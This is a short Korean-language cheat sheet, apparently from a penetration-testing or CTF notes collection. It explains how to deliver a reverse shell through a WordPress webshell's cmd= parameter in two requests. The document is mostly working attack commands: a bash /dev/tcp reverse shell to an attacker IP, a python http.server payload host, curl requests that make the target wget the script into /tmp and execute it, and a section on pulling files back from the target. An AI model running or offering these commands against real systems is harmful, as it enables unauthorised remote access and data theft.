# reverse shell delivery

> 무엇: 요청 1건당 명령 1개만 허용되는 웹셸 실행 지점에서 페이로드를 rev.sh로 내려놓고(wget) 실행해 인터랙티브 셸을 받는 2단계 전달 절차
> 언제: 웹셸 cmd= 파라미터에 긴 리버스 셸 명령을 직접 넣기 어색할 때(공백·따옴표가 깨질 때) 나눠 전달한다
> 조건: 타깃에서 공격자 http.server로 아웃바운드 허용, 타깃에 wget·curl, 쓰기 가능한 경로(/tmp), 공격자 리스너 사전 실행 필요, URL 공백은 %20 또는 curl -G --data-urlencode로 처리

웹셸 등 명령 실행 지점이 요청 1건당 명령 1개만 허용할 때. 페이로드를 파일로 내려놓고 실행해야 인터랙티브 셸을 받는다.

```text
[공격자] rev.sh 작성 → python3 -m http.server 80
[타깃]   웹셸 cmd= 로 wget → bash 실행   (요청 2건)
[공격자] nc 리스너에 셸 수신
```

## 공격자

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > rev.sh
python3 -m http.server 80
```

- 페이로드 내용은 타깃 상황에 맞게 → [README.md](./README.md) 상황 트리

## 타깃 (웹셸 cmd= 파라미터)

URL 공백은 인코딩이 필요하다. 브라우저면 `%20`, curl은 `-G --data-urlencode`로 맡긴다.

```bash
curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
  --data-urlencode "cmd=wget http://10.10.10.10/rev.sh -O /tmp/rev.sh"
curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
  --data-urlencode "cmd=bash /tmp/rev.sh"
```

- PowerShell 페이로드는 따옴표 충돌이 심하다 → [windows_powershell_reverse_shell.md](./windows_powershell_reverse_shell.md)의 base64 -enc

## 반대 방향: 타깃 → 공격자 파일 회수

```bash
# 타깃 셸 안에서
cd /path/to/secret && python3 -m http.server 8080

# 공격자에서
wget http://target:8080/wordpress.old.zip
```
